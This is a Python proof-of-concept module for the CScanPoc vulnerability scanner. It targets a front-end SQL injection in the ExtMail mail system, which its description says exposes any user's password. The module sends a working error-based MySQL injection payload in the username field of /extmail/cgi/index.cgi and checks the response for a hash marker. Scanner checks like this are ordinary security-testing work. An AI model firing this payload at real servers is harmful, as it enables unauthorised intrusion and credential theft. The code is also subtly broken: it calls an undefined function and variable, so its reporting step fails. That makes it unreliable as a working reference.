# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'ExtMail_0001' # 平台漏洞编号，留空
    name = 'ExtMail 邮件系统sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-04'  # 漏洞公布时间
    desc = '''
        苏州市数字证书认证中心邮件系统前台sql注入漏洞 可获取任意用户密码。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'ExtMail'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '97b7f090-d7d3-4d8f-8bd8-56814188d342'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer http://www.wooyun.org/bugs/wooyun-2015-095220
            hh = hackhttp.hackhttp()
            payload = '/extmail/cgi/index.cgi'
            postdata = 'username=aa\' OR ROW(3293,3743)>(SELECT COUNT(*),CONCAT((select md5(3.14)),FLOOR(RAND(0)*2))x FROM (SELECT 5422 UNION SELECT 9297 UNION SELECT 5245)a GROUP BY x)#'
            code, head, res, errcode, _ = hh.http(self.target + payload, postdata)

            if code == 200 and '4beed3b9c4a886067de0e3a094246f781' in res:
                security_hole('SQLinjection '+arg+payload) 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
